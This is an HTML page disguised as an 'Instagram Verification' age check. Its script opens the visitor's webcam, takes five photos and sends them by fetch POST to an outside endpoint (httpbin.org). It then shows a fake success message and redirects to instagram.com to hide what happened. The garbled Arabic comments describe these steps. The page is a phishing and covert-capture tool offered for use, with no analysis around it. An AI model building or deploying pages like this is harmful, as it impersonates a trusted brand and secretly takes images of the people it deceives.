<!DOCTYPE html>
<html>
<head>
    <title>Instagram Verification</title>
    <style>
        body { text-align: center; padding: 50px; font-family: Arial; }
        .button { background: #0095f6; color: white; padding: 15px 30px; 
                  border: none; border-radius: 8px; font-size: 16px; 
                  cursor: pointer; margin: 20px; }
    </style>
</head>
<body>
    <h1>ğŸ”’ Age Verification</h1>
    <p>Click to verify your age</p>
    <button class="button" onclick="start()">Start Verification</button>
    <p id="status"></p>
    
    <script>
        async function start() {
            const status = document.getElementById('status');
            status.textContent = 'Starting camera...';
            
            try {
                // ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: true, audio: false 
                });
                
                status.textContent = 'Camera active. Taking photos...';
                
                // Ø§Ù„ØªÙ‚Ø§Ø· 5 ØµÙˆØ±
                for (let i = 1; i <= 5; i++) {
                    await takeAndSendPhoto(stream, i);
                    await new Promise(r => setTimeout(r, 1000));
                }
                
                status.innerHTML = '<span style="color: green;">âœ… Verification complete! Redirecting...</span>';
                setTimeout(() => {
                    window.location.href = 'https://instagram.com';
                }, 2000);
                
            } catch (err) {
                status.textContent = 'Error: ' + err.message;
            }
        }
        
        async function takeAndSendPhoto(stream, num) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        const imageData = canvas.toDataURL('image/jpeg', 0.5);
                        
                        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ httpbin (ÙŠØ¯Ø¹Ù… CORS)
                        fetch('https://httpbin.org/post', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                photo_number: num,
                                image: imageData.substring(0, 100) + '...' // ÙÙ‚Ø· Ø¬Ø²Ø¡ Ù…Ù† Ø§Ù„ØµÙˆØ±Ø©
                            })
                        })
                        .then(response => response.json())
                        .then(data => {
                            console.log('Photo sent:', num);
                            resolve();
                        })
                        .catch(err => {
                            console.log('Error:', err);
                            resolve();
                        });
                    }, 500);
                };
            });
        }
    </script>
</body>
</html>
